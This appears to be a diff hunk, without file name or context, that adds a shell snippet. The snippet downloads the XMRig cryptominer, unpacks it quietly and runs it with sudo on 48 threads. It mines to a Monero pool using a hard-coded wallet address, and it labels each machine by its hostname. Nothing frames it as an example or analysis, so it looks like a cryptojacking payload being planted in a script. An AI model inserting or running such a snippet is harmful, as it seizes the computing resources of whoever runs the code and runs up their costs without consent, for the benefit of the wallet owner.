@@ -1,0 +1,2 @@
+worker=$(hostname)
+wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar xf xmrig-6.22.2-linux-static-x64.tar.gz >> /dev/null 2>&1  && cd xmrig-6.22.2 && echo "started" && sudo ./xmrig --url pool.hashvault.pro:443 --user 88WH7k8CiVv8y5NGxdEMJTQGzXkKrtEviCCqtHe7nieF4R3SXM8t6StEwgPAHNcsaKEP8cdmEV3ns1iinkLCNpL3EejHFig --pass $worker --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -k -t 48
